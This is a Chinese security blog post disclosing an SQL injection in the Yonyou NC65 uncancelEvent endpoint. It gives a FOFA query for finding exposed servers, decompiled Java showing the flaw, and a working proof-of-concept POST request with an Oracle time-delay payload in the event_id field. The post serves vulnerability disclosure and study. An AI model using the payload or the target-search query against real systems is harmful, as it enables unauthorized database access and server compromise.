---
title: "用友NC uncancelEvent SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-uncancelEvent-sqli.html
asset_dir: assets/用友nc-uncancelevent-sql注入漏洞
---

# 用友NC uncancelEvent SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/26 08:29
- 1192浏览
- [0评论](#comment)
- 30分钟阅读

深入探索

dbms

数据库

SQL

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友) NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。⽤友NC `oacoSchedulerEvents/uncancelEvent` 接⼝处存在[SQL注入漏洞](https://mrxn.net/tag/SQL注入)，未授权的攻击者可以通过此漏洞获取数据库权限，进 ⼀步利⽤可导致服务器失陷。

SQL注入防护

# 影响版本

NC65

# fofa语法

> `icon_hash="1085941792" || app="用友-UFIDA-NC"`

# 漏洞分析

`SchedulerEventsAction` 此前出现过 `listUserSharingEvents` sql注入漏洞，详情可以看这篇[用友NC listUserSharingEvents SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html) ，而此次出现漏洞的方法变成了 `uncancelEvent`

```
public void uncancelEvent() throws BusinessException {
        this.cancelEventOperate("1");
    }

    private void cancelEventOperate(String cancelType) throws BusinessException {
        ISchedulerQueryService schedulerQueryService = (ISchedulerQueryService)NCLocator.getInstance().lookup(ISchedulerQueryService.class);
        ISchedulerManageService schedulerManageService = (ISchedulerManageService)NCLocator.getInstance().lookup(ISchedulerManageService.class);
        String pk_event = SchedulerUtils.encodeURI(this.getRequest().getParameter("event_id"));
        String event_ts = SchedulerUtils.encodeURI(this.getRequest().getParameter("event_ts"));
        String startDate = SchedulerUtils.encodeURI(this.getRequest().getParameter("startDate"));
        String endDate = SchedulerUtils.encodeURI(this.getRequest().getParameter("endDate"));
        String oper_type = SchedulerUtils.encodeURI(this.getRequest().getParameter("oper_type"));
        String startDateOld = SchedulerUtils.encodeURI(this.getRequest().getParameter("startDate_old"));
        String event_type = SchedulerUtils.encodeURI(this.getRequest().getParameter("eventtype"));
        String source_id = SchedulerUtils.encodeURI(this.getRequest().getParameter("sourceid"));
        UFDateTime startDateOldDt = null;

        try {
            startDateOldDt = new UFDateTime(startDateOld);
        } catch (Exception var19) {
            startDateOldDt = new UFDateTime(startDate);
        }

        SchedulerEventJudger judger = new SchedulerEventJudger(schedulerQueryService);
        judger.getClass();
        SchedulerEventJudger.JudgedEvent judgerEvent = new SchedulerEventJudger.JudgedEvent(judger);
        judgerEvent.setPk_event(pk_event);
        judgerEvent.setStartDate(new UFDateTime(startDate));
        judgerEvent.setStartDateOld(startDateOldDt);
        judgerEvent.setEvent_ts(new UFDateTime(event_ts));
        VersionStateEnum judgerState = judger.judgeCompatibleEvent(judgerEvent);
```

它与前面的文章 [用友NC changeEvent SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html) 处理逻辑是一样的，也是因为`pid_event` 被直接拼接到sql语句中进行执行从而造成[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用需要条件

代码安全审计

1. 请求中需包含 `event_id` 参数（含 `#` 字符）。
2. 其他参数（如 `startDate`、`event_ts`、`startDate_old`）需满足类型要求（可伪造合法值如 2025-05-07 12:12:12）。

```
POST /portal/pt/oacoSchedulerEvents/uncancelEvent?pageId=login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: nc65.mrxn.net

event_id=-1'AND 1=dbms_pipe.receive_message('RDS',3)--+#+&startDate=2025-05-07 12:12:12&event_ts=2025-05-07 12:12:12&event_ts=2025-05-07 12:12:12
```

[![用友NC uncancelEvent SQL注入漏洞](images/img-001-252779943ff7.webp)](https://image.mrxn.net/4b5bacee34e44ba3a69b70df7caf5718.webp)

成功延时 3 秒

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
